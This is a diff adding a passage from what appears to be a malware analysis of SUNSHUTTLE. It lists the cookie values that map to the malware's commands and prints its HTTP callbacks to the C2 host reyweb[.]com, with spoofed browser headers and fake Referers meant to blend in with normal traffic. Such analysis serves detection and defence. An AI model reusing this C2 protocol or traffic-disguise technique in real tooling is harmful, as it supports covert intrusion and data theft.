@@ -1,0 +1,9 @@
+
+“P5hCrabkKf=” Cookie Value Meaning gZLXIeK main_request_session_key do1KiqzhQ main_clean_file t5UITQ2PdFg5 main_wget_file cIHiqD5p4da6OeB main_retrieve_session_key xpjQVt3bJzWuv main_send_file_part S4rgG1WifHU
+main_send_command_result
+After successful installation / initialization of the malware, it proceeds to make the following callback to the C2 server reyweb[.]com via TCP/443 HTTPS:
+Victim to C2 GET /assets/index.php HTTP/1.1 Host: reyweb[.]com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0 Cookie: HjELmFxKJc=48b9e25491e088a35105274cae0b9e67; P5hCrabkKf=gZLXIeKI; iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx; b7XCoFSvs1YRW=78 Referer: www.facebook.com Accept-Encoding: gzip Victim to C2 GET /assets/index.php HTTP/1.1 Host: reyweb[.]com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0 Cookie: HjELmFxKJc=48b9e25491e088a35105274cae0b9e67; P5hCrabkKf=gZLXIeKI; iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx; b7XCoFSvs1YRW=78 Referer: www.yahoo.com Accept-Encoding: gzip Additionally, if the “fake_requesting” configuration value is set to 1, SUNSHUTTLE will generate traffic meant to blend in with real traffic.
